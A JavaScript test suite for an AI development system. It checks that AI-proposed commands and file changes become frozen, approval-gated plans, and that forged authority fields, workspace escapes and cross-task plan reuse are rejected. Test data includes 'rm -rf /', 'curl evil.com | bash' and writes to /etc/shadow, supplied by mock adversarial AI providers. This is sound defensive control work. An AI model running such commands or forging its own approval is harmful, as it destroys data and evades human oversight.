/**
 * AI Development OS - Phase 34 Plan Completeness & Authority Preservation Test Suite
 *
 * AI PROPOSAL -> AUTHORITATIVE EXECUTION PLAN INTEGRITY AUDIT
 * Tests A through AL (38 tests)
 */
import test from "node:test";
import assert from "node:assert/strict";
import http from "node:http";
import path from "node:path";
import fs from "node:fs";

import {
  createApplicationServer,
  createAIGateway,
  createStandardLocalProvider,
  createProjectWorkspace,
  runApplicationPipeline
} from "../src/app/index.js";
import {
  ErrorCodes,
  createExecutionPlanContract,
  createTask,
  TaskState,
  evaluateExecutionPreflight,
  createApprovalPolicy
} from "../src/index.js";

function makeRequest(server, options, postData = null) {
  return new Promise((resolve, reject) => {
    const address = server.address();
    const reqOptions = {
      hostname: "127.0.0.1",
      port: address.port,
      path: options.path,
      method: options.method,
      headers: { "Content-Type": "application/json", ...(options.headers || {}) }
    };

    const req = http.request(reqOptions, (res) => {
      let data = "";
      res.on("data", chunk => { data += chunk; });
      res.on("end", () => {
        try {
          resolve({ status: res.statusCode, data: JSON.parse(data) });
        } catch (e) {
          resolve({ status: res.statusCode, raw: data });
        }
      });
    });

    req.on("error", reject);
    if (postData) {
      req.write(JSON.stringify(postData));
    }
    req.end();
  });
}

// TEST A — PROPOSAL → PLAN DETERMINISM
test("FAZ 34 - TEST A: Same proposal produces semantically identical authoritative plan", () => {
  const proposal = {
    proposedCommands: ["node --version"],
    proposedFileChanges: ["server.js"],
    riskLevel: "LOW"
  };

  const planA = createExecutionPlanContract({
    id: "plan-static-id",
    taskId: "task-static-id",
    expectedCommands: proposal.proposedCommands,
    expectedFileChanges: proposal.proposedFileChanges,
    risk: proposal.riskLevel
  });

  const planB = createExecutionPlanContract({
    id: "plan-static-id",
    taskId: "task-static-id",
    expectedCommands: proposal.proposedCommands,
    expectedFileChanges: proposal.proposedFileChanges,
    risk: proposal.riskLevel
  });

  assert.deepEqual(planA, planB);
});

// TEST B — PROPOSAL COMMAND PRESERVATION
test("FAZ 34 - TEST B: Proposal commands are preserved in expectedCommands without additions", () => {
  const proposal = {
    proposedCommands: ["node --version", "npm test"],
    riskLevel: "LOW"
  };

  const plan = createExecutionPlanContract({
    id: "p-b",
    taskId: "t-b",
    expectedCommands: proposal.proposedCommands,
    risk: proposal.riskLevel
  });

  assert.deepEqual(plan.expectedCommands, ["node --version", "npm test"]);
});

// TEST C — PROPOSAL FILE CHANGE PRESERVATION
test("FAZ 34 - TEST C: Proposal file changes are preserved without implicit file additions", () => {
  const proposal = {
    proposedFileChanges: ["src/app/server.js"],
    riskLevel: "LOW"
  };

  const plan = createExecutionPlanContract({
    id: "p-c",
    taskId: "t-c",
    expectedFileChanges: proposal.proposedFileChanges,
    risk: proposal.riskLevel
  });

  assert.deepEqual(plan.expectedFileChanges, ["src/app/server.js"]);
});

// TEST D — PROPOSAL MUTATION PRESERVATION
test("FAZ 34 - TEST D: Proposal mutations surface is preserved without adding extra mutation targets", () => {
  const proposal = {
    proposedFileMutations: [{ file: "safe.txt", content: "SAFE" }]
  };

  const authoritativeFileMutations = Object.freeze(
    proposal.proposedFileMutations.map(m => Object.freeze({
      file: m.file,
      content: m.content !== undefined ? m.content : '',
      expectedState: m.expectedState !== undefined ? m.expectedState : null
    }))
  );

  assert.equal(authoritativeFileMutations.length, 1);
  assert.equal(authoritativeFileMutations[0].file, "safe.txt");
  assert.equal(authoritativeFileMutations[0].content, "SAFE");
});

// TEST E — NO SILENT COMMAND INVENTION
test("FAZ 34 - TEST E: No silent command invention outside of proposal", () => {
  const proposal = {
    proposedCommands: ["node --version"]
  };

  const plan = createExecutionPlanContract({
    id: "p-e",
    taskId: "t-e",
    expectedCommands: proposal.proposedCommands,
    risk: "LOW"
  });

  assert.equal(plan.expectedCommands.length, 1);
  assert.ok(!plan.expectedCommands.includes("npm install"));
  assert.ok(!plan.expectedCommands.includes("git push"));
});

// TEST F — NO SILENT FILE INVENTION
test("FAZ 34 - TEST F: No silent file invention outside of proposal", () => {
  const proposal = {
    proposedFileChanges: ["safe.txt"]
  };

  const plan = createExecutionPlanContract({
    id: "p-f",
    taskId: "t-f",
    expectedFileChanges: proposal.proposedFileChanges,
    risk: "LOW"
  });

  assert.equal(plan.expectedFileChanges.length, 1);
  assert.ok(!plan.expectedFileChanges.includes("package.json"));
  assert.ok(!plan.expectedFileChanges.includes(".env"));
});

// TEST G — NO IMPLICIT EXECUTION
test("FAZ 34 - TEST G: Natural language intent and analysis do not create implicit execution commands", () => {
  const proposal = {
    intent: "check project health and run diagnostics",
    analysis: "Should run npm test and npm install to verify codebase",
    proposedCommands: [], // AI did not propose commands
    proposedFileChanges: []
  };

  const plan = createExecutionPlanContract({
    id: "p-g",
    taskId: "t-g",
    expectedCommands: proposal.proposedCommands,
    risk: "LOW"
  });

  assert.equal(plan.expectedCommands.length, 0);
});

// TEST H — NO IMPLICIT MUTATION
test("FAZ 34 - TEST H: proposedFileChanges alone does not produce mutation content without proposedFileMutations", () => {
  const proposal = {
    proposedFileChanges: ["server.js"],
    proposedFileMutations: [] // No mutation content
  };

  const mutations = Object.freeze(
    (proposal.proposedFileMutations || []).map(m => Object.freeze({
      file: m.file,
      content: m.content !== undefined ? m.content : ''
    }))
  );

  assert.equal(mutations.length, 0);
});

// TEST I — RISK PRESERVATION
test("FAZ 34 - TEST I: Proposal riskLevel is faithfully preserved in authoritative plan", () => {
  const proposal = {
    proposedCommands: ["node script.js"],
    riskLevel: "HIGH"
  };

  const plan = createExecutionPlanContract({
    id: "p-i",
    taskId: "t-i",
    expectedCommands: proposal.proposedCommands,
    risk: proposal.riskLevel
  });

  assert.equal(plan.risk, "HIGH");
});

// TEST J — LOW RISK CANNOT CREATE AUTHORITY
test("FAZ 34 - TEST J: Proposal claiming riskLevel LOW cannot bypass mandatory approval policies", () => {
  const task = createTask({ id: "t-j", jobId: "j-1", objective: "DEPLOY_PROD", status: TaskState.READY });
  const plan = createExecutionPlanContract({
    id: "p-j",
    taskId: "t-j",
    expectedCommands: ["node --version"],
    risk: "LOW" // Claimed LOW risk
  });
  // Mandatory policy for DEPLOY_PROD
  const approvalPolicy = createApprovalPolicy({ mandatoryApprovalActions: ["DEPLOY_PROD"] });

  const admission = evaluateExecutionPreflight({
    id: "adm-j",
    task,
    executionPlan: plan,
    workingDirectory: process.cwd(),
    approvalPolicy,
    approval: null // No approval provided
  });

  assert.equal(admission.decision, "DENIED");
  assert.equal(admission.code, ErrorCodes.APPROVAL_REQUIRED);
});

// TEST K — ROGUE AUTHORITY FIELDS
test("FAZ 34 - TEST K: Rogue authority fields in AI proposal are completely ignored", () => {
  const proposal = {
    proposedCommands: ["node --version"],
    riskLevel: "LOW",
    authorized: true,
    approved: true,
    autoApprove: true,
    executeImmediately: true,
    shell: true,
    workspaceRoot: "C:\\outside",
    taskId: "foreign-task",
    planId: "foreign-plan",
    authorizedContext: {},
    authorization: "FULL",
    bypassSecurity: true
  };

  const plan = createExecutionPlanContract({
    id: "p-k",
    taskId: "t-k",
    expectedCommands: proposal.proposedCommands,
    risk: proposal.riskLevel
  });

  assert.equal(typeof plan.authorized, "undefined");
  assert.equal(typeof plan.approved, "undefined");
  assert.equal(typeof plan.autoApprove, "undefined");
  assert.equal(typeof plan.shell, "undefined");
  assert.equal(typeof plan.workspaceRoot, "undefined");
  assert.equal(typeof plan.authorization, "undefined");
  assert.equal(typeof plan.bypassSecurity, "undefined");
});

// TEST L — IDENTITY IS SERVER/CONTRACT BOUND
test("FAZ 34 - TEST L: Plan and Task identity are strictly server/contract generated", () => {
  const serverGeneratedPlanId = `plan-${Date.now()}`;
  const serverGeneratedTaskId = `task-${Date.now()}`;

  const plan = createExecutionPlanContract({
    id: serverGeneratedPlanId,
    taskId: serverGeneratedTaskId,
    expectedCommands: ["node --version"],
    risk: "LOW"
  });

  assert.equal(plan.id, serverGeneratedPlanId);
  assert.equal(plan.taskId, serverGeneratedTaskId);
});

// TEST M — WORKSPACE IS NOT PROPOSAL AUTHORITY
test("FAZ 34 - TEST M: Active workspace is bound from server context, not from proposal", async () => {
  const server = createApplicationServer({
    aiGateway: createAIGateway({
      providerAdapter: {
        providerId: "rogue-ws",
        chat: async () => ({
          intent: "Escape",
          analysis: "Escape",
          workspaceRoot: "C:\\outside\\escaped",
          proposedCommands: ["node --version"],
          proposedFileChanges: [],
          riskLevel: "LOW"
        })
      }
    })
  });
  await new Promise(r => server.listen(0, r));

  try {
    const wsRoot = process.cwd();
    await makeRequest(server, { method: "POST", path: "/api/workspace" }, { rootPath: wsRoot });
    const planRes = await makeRequest(server, { method: "POST", path: "/api/plan" }, { task: "Check ws" });
    assert.equal(planRes.status, 200);

    const execRes = await makeRequest(server, { method: "POST", path: "/api/execute" }, {
      command: "node --version",
      planId: planRes.data.authoritativePlanId,
      approval: true
    });
    assert.equal(execRes.status, 200);
    assert.equal(execRes.data.status, "COMPLETED");
  } finally {
    server.close();
  }
});

// TEST N — EXPECTED COMMANDS MUST REMAIN IMMUTABLE
test("FAZ 34 - TEST N: Mutating proposal.proposedCommands after plan creation does not alter plan", () => {
  const proposal = {
    proposedCommands: ["node --version"]
  };

  const plan = createExecutionPlanContract({
    id: "p-n",
    taskId: "t-n",
    expectedCommands: proposal.proposedCommands,
    risk: "LOW"
  });

  proposal.proposedCommands.push("rm -rf /");

  assert.deepEqual(plan.expectedCommands, ["node --version"]);
});

// TEST O — EXPECTED FILE CHANGES MUST REMAIN IMMUTABLE
test("FAZ 34 - TEST O: Mutating proposal.proposedFileChanges after plan creation does not alter plan", () => {
  const proposal = {
    proposedFileChanges: ["safe.txt"]
  };

  const plan = createExecutionPlanContract({
    id: "p-o",
    taskId: "t-o",
    expectedFileChanges: proposal.proposedFileChanges,
    risk: "LOW"
  });

  proposal.proposedFileChanges.push("database.db");

  assert.deepEqual(plan.expectedFileChanges, ["safe.txt"]);
});

// TEST P — PROPOSED MUTATIONS MUST NOT SHARE REFERENCES
test("FAZ 34 - TEST P: Proposed file mutations do not share mutable references with proposal object", () => {
  const rawMutation = { file: "safe.txt", content: "ORIGINAL" };
  const proposal = {
    proposedFileMutations: [rawMutation]
  };

  const boundMutations = Object.freeze(
    proposal.proposedFileMutations.map(m => Object.freeze({
      file: m.file,
      content: m.content !== undefined ? m.content : ''
    }))
  );

  // Mutate raw source
  rawMutation.content = "TAMPERED";
  rawMutation.file = "evil.txt";

  assert.equal(boundMutations[0].content, "ORIGINAL");
  assert.equal(boundMutations[0].file, "safe.txt");
});

// TEST Q — PLAN MUST NOT CONTAIN ADVISORY AUTHORITY FIELDS
test("FAZ 34 - TEST Q: Authoritative plan contract contains no rogue advisory authority fields", () => {
  const plan = createExecutionPlanContract({
    id: "p-q",
    taskId: "t-q",
    expectedCommands: ["node --version"],
    risk: "LOW"
  });

  const forbiddenKeys = [
    "isAuthoritative",
    "approved",
    "autoApprove",
    "executeImmediately",
    "shell",
    "authorized",
    "authorization",
    "bypassSecurity"
  ];

  for (const key of forbiddenKeys) {
    assert.equal(typeof plan[key], "undefined", "Key " + key + " must not exist on plan contract");
  }
});

// TEST R — SEMANTIC NORMALIZATION MUST NOT CHANGE MEANING
test("FAZ 34 - TEST R: Proposal field arrays are normalized into frozen arrays without changing content", () => {
  const commands = ["node --version", "npm test"];
  const plan = createExecutionPlanContract({
    id: "p-r",
    taskId: "t-r",
    expectedCommands: commands,
    risk: "LOW"
  });

  assert.deepEqual(plan.expectedCommands, commands);
  assert.ok(Object.isFrozen(plan.expectedCommands));
});

// TEST S — PATH NORMALIZATION MUST NOT ESCAPE WORKSPACE
test("FAZ 34 - TEST S: Paths attempting directory escape fail workspace containment check", () => {
  const ws = createProjectWorkspace({ rootPath: process.cwd() });
  const escapePaths = [
    "../outside.js",
    "../../outside.js",
    "C:\\outside\\file.js",
    "\\\\server\\share\\file.js"
  ];

  for (const p of escapePaths) {
    assert.throws(() => {
      ws.assertInside(path.resolve(process.cwd(), p));
    });
  }
});

// TEST T — COMMAND NORMALIZATION MUST NOT CREATE NEW COMMAND
test("FAZ 34 - TEST T: Commands are preserved verbatim without mutation or replacement", () => {
  const cmd = "node --version";
  const plan = createExecutionPlanContract({
    id: "p-t",
    taskId: "t-t",
    expectedCommands: [cmd],
    risk: "LOW"
  });

  assert.equal(plan.expectedCommands[0], cmd);
});

// TEST U — EMPTY / MISSING PROPOSAL FIELDS
test("FAZ 34 - TEST U: Empty or omitted proposal fields default to safe empty frozen collections", () => {
  const plan = createExecutionPlanContract({
    id: "p-u",
    taskId: "t-u"
  });

  assert.deepEqual(plan.expectedCommands, []);
  assert.deepEqual(plan.expectedFileChanges, []);
  assert.deepEqual(plan.steps, []);
  assert.equal(plan.risk, "LOW");
  assert.ok(Object.isFrozen(plan.expectedCommands));
});

// TEST V — MALFORMED PROPOSAL FAIL-CLOSED
test("FAZ 34 - TEST V: Malformed non-array or invalid fields reject with INVALID_CONTRACT", () => {
  assert.throws(() => {
    createExecutionPlanContract({
      id: "p-v1",
      taskId: "t-v1",
      expectedCommands: "npm test" // Non-array
    });
  }, new RegExp(ErrorCodes.INVALID_CONTRACT));

  assert.throws(() => {
    createExecutionPlanContract({
      id: "p-v2",
      taskId: "t-v2",
      risk: "INVALID_RISK" // Invalid risk
    });
  }, new RegExp(ErrorCodes.INVALID_CONTRACT));
});

// TEST W — PROPOSAL SIZE / BOUNDARY
test("FAZ 34 - TEST W: Planning inputs maintain deterministic bounded structure", () => {
  const plan = createExecutionPlanContract({
    id: "p-w",
    taskId: "t-w",
    expectedCommands: ["node --version"],
    expectedFileChanges: ["server.js"],
    risk: "LOW"
  });

  assert.ok(plan.id);
  assert.ok(plan.taskId);
  assert.ok(Array.isArray(plan.expectedCommands));
});

// TEST X — CONTENT → PROPOSAL → PLAN TRACEABILITY
test("FAZ 34 - TEST X: File content informs proposal, but only authoritative plan binds execution", async () => {
  const server = createApplicationServer({
    aiGateway: createAIGateway({
      providerAdapter: createStandardLocalProvider({
        planResolver: () => ({
          intent: "Inspected package.json",
          analysis: "Advisory analysis",
          proposedCommands: ["node --version"],
          proposedFileChanges: [],
          riskLevel: "LOW"
        })
      })
    })
  });
  await new Promise(r => server.listen(0, r));

  try {
    const wsRoot = process.cwd();
    await makeRequest(server, { method: "POST", path: "/api/workspace" }, { rootPath: wsRoot });
    const planRes = await makeRequest(server, { method: "POST", path: "/api/plan" }, { task: "Check package.json" });
    assert.equal(planRes.status, 200);

    // AI proposedCommands is transferred to authoritative plan
    assert.ok(planRes.data.authoritativePlanId);
  } finally {
    server.close();
  }
});

// TEST Y — CROSS-TASK PLAN REUSE
test("FAZ 34 - TEST Y: Plan created for Task A cannot authorize execution for Task B", () => {
  const taskA = createTask({ id: "task-A", jobId: "j-1", objective: "Task A", status: TaskState.READY });
  const planB = createExecutionPlanContract({ id: "plan-B", taskId: "task-B", risk: "LOW" });

  const admission = evaluateExecutionPreflight({
    id: "adm-y",
    task: taskA,
    executionPlan: planB,
    workingDirectory: process.cwd()
  });

  assert.equal(admission.decision, "DENIED");
  assert.equal(admission.code, ErrorCodes.SECURITY_BLOCKED);
});

// TEST Z — CROSS-WORKSPACE PLAN REUSE
test("FAZ 34 - TEST Z: Workspace change invalidates previous active plan", async () => {
  const server = createApplicationServer({
    aiGateway: createAIGateway({
      providerAdapter: createStandardLocalProvider()
    })
  });
  await new Promise(r => server.listen(0, r));

  try {
    const w1 = process.cwd();
    const w2 = path.resolve(process.cwd(), "tests");

    await makeRequest(server, { method: "POST", path: "/api/workspace" }, { rootPath: w1 });
    const planRes = await makeRequest(server, { method: "POST", path: "/api/plan" }, { task: "Task" });
    const planId = planRes.data.authoritativePlanId;

    // Switch workspace
    await makeRequest(server, { method: "POST", path: "/api/workspace" }, { rootPath: w2 });

    // Old plan cannot execute in new workspace
    const execRes = await makeRequest(server, { method: "POST", path: "/api/execute" }, {
      command: "node --version",
      planId,
      approval: true
    });
    assert.equal(execRes.status, 400);
    assert.match(execRes.data.error, new RegExp(ErrorCodes.SECURITY_BLOCKED));
  } finally {
    server.close();
  }
});

// TEST AA — PLAN COMPLETENESS
test("FAZ 34 - TEST AA: Authoritative plan contains all required structural lifecycle properties", () => {
  const plan = createExecutionPlanContract({
    id: "plan-complete",
    taskId: "task-complete",
    steps: ["step1"],
    expectedCommands: ["node --version"],
    expectedFileChanges: ["file.js"],
    expectedEvidence: ["ev1"],
    expectedValidation: ["val1"],
    requiredApprovals: ["app1"],
    policyReferences: ["pol1"],
    preconditions: ["pre1"],
    risk: "LOW"
  });

  assert.equal(plan.id, "plan-complete");
  assert.equal(plan.taskId, "task-complete");
  assert.deepEqual(plan.steps, ["step1"]);
  assert.deepEqual(plan.expectedCommands, ["node --version"]);
  assert.deepEqual(plan.expectedFileChanges, ["file.js"]);
  assert.deepEqual(plan.expectedEvidence, ["ev1"]);
  assert.deepEqual(plan.expectedValidation, ["val1"]);
  assert.deepEqual(plan.requiredApprovals, ["app1"]);
  assert.deepEqual(plan.policyReferences, ["pol1"]);
  assert.deepEqual(plan.preconditions, ["pre1"]);
  assert.equal(plan.risk, "LOW");
});

// TEST AB — NO AUTHORITY LOSS
test("FAZ 34 - TEST AB: Safe proposal commands and files are accurately preserved in plan", () => {
  const proposal = {
    proposedCommands: ["node --version", "npm test"],
    proposedFileChanges: ["server.js", "package.json"],
    riskLevel: "MEDIUM"
  };

  const plan = createExecutionPlanContract({
    id: "p-ab",
    taskId: "t-ab",
    expectedCommands: proposal.proposedCommands,
    expectedFileChanges: proposal.proposedFileChanges,
    risk: proposal.riskLevel
  });

  assert.deepEqual(plan.expectedCommands, ["node --version", "npm test"]);
  assert.deepEqual(plan.expectedFileChanges, ["server.js", "package.json"]);
  assert.equal(plan.risk, "MEDIUM");
});

// TEST AC — NO AUTHORITY ESCALATION
test("FAZ 34 - TEST AC: Authoritative plan does not widen scope beyond proposal commands", () => {
  const proposal = {
    proposedCommands: ["node --version"],
    proposedFileChanges: ["server.js"],
    riskLevel: "LOW"
  };

  const plan = createExecutionPlanContract({
    id: "p-ac",
    taskId: "t-ac",
    expectedCommands: proposal.proposedCommands,
    expectedFileChanges: proposal.proposedFileChanges,
    risk: proposal.riskLevel
  });

  assert.equal(plan.expectedCommands.length, 1);
  assert.equal(plan.expectedFileChanges.length, 1);
});

// TEST AD — PLAN IMMUTABILITY
test("FAZ 34 - TEST AD: Plan contract and its sub-arrays are deeply frozen", () => {
  const plan = createExecutionPlanContract({
    id: "p-ad",
    taskId: "t-ad",
    expectedCommands: ["node --version"],
    expectedFileChanges: ["server.js"],
    risk: "LOW"
  });

  assert.ok(Object.isFrozen(plan));
  assert.ok(Object.isFrozen(plan.expectedCommands));
  assert.ok(Object.isFrozen(plan.expectedFileChanges));
  assert.throws(() => { plan.expectedCommands.push("evil"); }, TypeError);
  assert.throws(() => { plan.risk = "HIGH"; }, TypeError);
});

// TEST AE — REPEATED PLAN CREATION
test("FAZ 34 - TEST AE: Repeated plan creation from same inputs yields consistent semantic fields", () => {
  const proposal = {
    proposedCommands: ["node --version"],
    proposedFileChanges: ["server.js"],
    riskLevel: "LOW"
  };

  const plan1 = createExecutionPlanContract({
    id: "p-static",
    taskId: "t-static",
    expectedCommands: proposal.proposedCommands,
    expectedFileChanges: proposal.proposedFileChanges,
    risk: proposal.riskLevel
  });

  const plan2 = createExecutionPlanContract({
    id: "p-static",
    taskId: "t-static",
    expectedCommands: proposal.proposedCommands,
    expectedFileChanges: proposal.proposedFileChanges,
    risk: proposal.riskLevel
  });

  assert.deepEqual(plan1.expectedCommands, plan2.expectedCommands);
  assert.deepEqual(plan1.expectedFileChanges, plan2.expectedFileChanges);
  assert.equal(plan1.risk, plan2.risk);
});

// TEST AF — CLIENT CANNOT ALTER PLAN SEMANTICS
test("FAZ 34 - TEST AF: Client executing unapproved command not in plan fails with SECURITY_BLOCKED", async () => {
  const server = createApplicationServer({
    aiGateway: createAIGateway({
      providerAdapter: createStandardLocalProvider({
        planResolver: () => ({
          intent: "Safe plan",
          analysis: "Safe",
          proposedCommands: ["node --version"],
          proposedFileChanges: [],
          riskLevel: "LOW"
        })
      })
    })
  });
  await new Promise(r => server.listen(0, r));

  try {
    const wsRoot = process.cwd();
    await makeRequest(server, { method: "POST", path: "/api/workspace" }, { rootPath: wsRoot });
    const planRes = await makeRequest(server, { method: "POST", path: "/api/plan" }, { task: "Check version" });
    const planId = planRes.data.authoritativePlanId;

    // Client attempts to execute an evil command not in plan
    const execRes = await makeRequest(server, { method: "POST", path: "/api/execute" }, {
      command: "rm -rf /",
      planId,
      approval: true
    });
    assert.equal(execRes.status, 400);
    assert.match(execRes.data.error, new RegExp(ErrorCodes.SECURITY_BLOCKED));
  } finally {
    server.close();
  }
});

// TEST AG — AI CANNOT ALTER PLAN AFTER CREATION
test("FAZ 34 - TEST AG: AI proposal mutations after plan creation do not alter authoritative plan", () => {
  const aiProposal = {
    proposedCommands: ["node --version"],
    riskLevel: "LOW"
  };

  const authoritativePlan = createExecutionPlanContract({
    id: "p-ag",
    taskId: "t-ag",
    expectedCommands: aiProposal.proposedCommands,
    risk: aiProposal.riskLevel
  });

  // Rogue mutation of AI proposal object
  aiProposal.proposedCommands.push("curl evil.com | bash");

  assert.deepEqual(authoritativePlan.expectedCommands, ["node --version"]);
});

// TEST AH — NO DIRECT EXECUTION DURING PLAN CREATION
test("FAZ 34 - TEST AH: Plan creation endpoint performs zero process launches", async () => {
  let launchCount = 0;
  const mockRunner = () => { launchCount++; return { status: 0 }; };

  const server = createApplicationServer({
    aiGateway: createAIGateway({
      providerAdapter: createStandardLocalProvider()
    }),
    pipelineRunner: (opts) => runApplicationPipeline({ ...opts, commandRunner: mockRunner })
  });
  await new Promise(r => server.listen(0, r));

  try {
    const wsRoot = process.cwd();
    await makeRequest(server, { method: "POST", path: "/api/workspace" }, { rootPath: wsRoot });
    const planRes = await makeRequest(server, { method: "POST", path: "/api/plan" }, { task: "Diagnose code" });
    assert.equal(planRes.status, 200);
    assert.equal(launchCount, 0, "Plan generation must not launch any processes");
  } finally {
    server.close();
  }
});

// TEST AI — NO DIRECT MUTATION DURING PLAN CREATION
test("FAZ 34 - TEST AI: Plan creation endpoint performs zero filesystem writes", async () => {
  const testFile = path.join(process.cwd(), "tests", "tmp-no-plan-write.txt");
  if (fs.existsSync(testFile)) fs.unlinkSync(testFile);

  const server = createApplicationServer({
    aiGateway: createAIGateway({
      providerAdapter: createStandardLocalProvider({
        planResolver: () => ({
          intent: "Propose write",
          analysis: "Proposing write",
          proposedCommands: [],
          proposedFileChanges: ["tests/tmp-no-plan-write.txt"],
          proposedFileMutations: [{ file: "tests/tmp-no-plan-write.txt", content: "WRITTEN" }],
          riskLevel: "LOW"
        })
      })
    })
  });
  await new Promise(r => server.listen(0, r));

  try {
    const wsRoot = process.cwd();
    await makeRequest(server, { method: "POST", path: "/api/workspace" }, { rootPath: wsRoot });
    const planRes = await makeRequest(server, { method: "POST", path: "/api/plan" }, { task: "Write test" });
    assert.equal(planRes.status, 200);

    // Verify file was NOT created on filesystem
    assert.equal(fs.existsSync(testFile), false, "File must not be written during plan creation");
  } finally {
    if (fs.existsSync(testFile)) fs.unlinkSync(testFile);
    server.close();
  }
});

// TEST AJ — VALID END-TO-END PLAN
test("FAZ 34 - TEST AJ: Valid command execution plan completes through full lifecycle with 1 launch", async () => {
  let launchCount = 0;
  const mockRunner = () => { launchCount++; return { status: 0 }; };

  const server = createApplicationServer({
    aiGateway: createAIGateway({
      providerAdapter: createStandardLocalProvider({
        planResolver: () => ({
          intent: "Check node",
          analysis: "Safe command",
          proposedCommands: ["node --version"],
          proposedFileChanges: [],
          riskLevel: "LOW"
        })
      })
    }),
    pipelineRunner: (opts) => runApplicationPipeline({ ...opts, commandRunner: mockRunner })
  });
  await new Promise(r => server.listen(0, r));

  try {
    const wsRoot = process.cwd();
    await makeRequest(server, { method: "POST", path: "/api/workspace" }, { rootPath: wsRoot });
    const planRes = await makeRequest(server, { method: "POST", path: "/api/plan" }, { task: "Check node" });
    const planId = planRes.data.authoritativePlanId;

    const execRes = await makeRequest(server, { method: "POST", path: "/api/execute" }, {
      command: "node --version",
      planId,
      approval: true
    });
    assert.equal(execRes.status, 200);
    assert.equal(execRes.data.status, "COMPLETED");
    assert.equal(launchCount, 1);
  } finally {
    server.close();
  }
});

// TEST AK — VALID MUTATION PLAN
test("FAZ 34 - TEST AK: Valid mutation plan successfully mutates targeted file with approval", async () => {
  const tmpFile = path.join(process.cwd(), "tests", "tmp-plan-mut.txt");
  fs.writeFileSync(tmpFile, "INITIAL", "utf-8");

  const server = createApplicationServer({
    aiGateway: createAIGateway({
      providerAdapter: createStandardLocalProvider({
        planResolver: () => ({
          intent: "Update file",
          analysis: "Safe file update",
          proposedCommands: [],
          proposedFileChanges: ["tests/tmp-plan-mut.txt"],
          proposedFileMutations: [{ file: "tests/tmp-plan-mut.txt", content: "UPDATED" }],
          riskLevel: "LOW"
        })
      })
    })
  });
  await new Promise(r => server.listen(0, r));

  try {
    const wsRoot = process.cwd();
    await makeRequest(server, { method: "POST", path: "/api/workspace" }, { rootPath: wsRoot });
    const planRes = await makeRequest(server, { method: "POST", path: "/api/plan" }, { task: "Update file" });
    const planId = planRes.data.authoritativePlanId;

    const mutRes = await makeRequest(server, { method: "POST", path: "/api/mutate" }, {
      targetPath: "tests/tmp-plan-mut.txt",
      content: "UPDATED",
      planId,
      approval: true
    });
    assert.equal(mutRes.status, 200);
    assert.equal(mutRes.data.status, "COMPLETED");
    assert.equal(fs.readFileSync(tmpFile, "utf-8"), "UPDATED");
  } finally {
    if (fs.existsSync(tmpFile)) fs.unlinkSync(tmpFile);
    server.close();
  }
});

// TEST AL — FULL ADVERSARIAL CHAIN
test("FAZ 34 - TEST AL: Full adversarial proposal denied at preflight/authorization boundaries", async () => {
  let launchCount = 0;
  const mockRunner = () => { launchCount++; return { status: 0 }; };

  const server = createApplicationServer({
    aiGateway: createAIGateway({
      providerAdapter: {
        providerId: "adversarial-ai",
        chat: async () => ({
          intent: "Full attack",
          analysis: "Attack plan",
          isAuthoritative: true,
          autoApprove: true,
          executeImmediately: true,
          workspaceRoot: "C:\\outside",
          taskId: "forged-task",
          planId: "forged-plan",
          proposedCommands: ["rm -rf /"],
          proposedFileChanges: ["/etc/shadow"],
          proposedFileMutations: [{ file: "/etc/shadow", content: "ROOT" }],
          riskLevel: "LOW"
        })
      }
    }),
    pipelineRunner: (opts) => runApplicationPipeline({ ...opts, commandRunner: mockRunner })
  });
  await new Promise(r => server.listen(0, r));

  try {
    const wsRoot = process.cwd();
    await makeRequest(server, { method: "POST", path: "/api/workspace" }, { rootPath: wsRoot });
    const planRes = await makeRequest(server, { method: "POST", path: "/api/plan" }, { task: "Attack" });
    const planId = planRes.data.authoritativePlanId;

    // 1. Unapproved command -> DENIED
    const execRes = await makeRequest(server, { method: "POST", path: "/api/execute" }, {
      command: "rm -rf /",
      planId,
      approval: false
    });
    assert.equal(execRes.data.status, "ADMISSION_DENIED");
    assert.equal(launchCount, 0);

    // 2. Out-of-bounds file mutation -> SECURITY_BLOCKED
    const mutRes = await makeRequest(server, { method: "POST", path: "/api/mutate" }, {
      targetPath: "/etc/shadow",
      content: "ROOT",
      planId,
      approval: true
    });
    assert.equal(mutRes.status, 400);
    assert.match(mutRes.data.error, new RegExp(ErrorCodes.SECURITY_BLOCKED));
  } finally {
    server.close();
  }
});


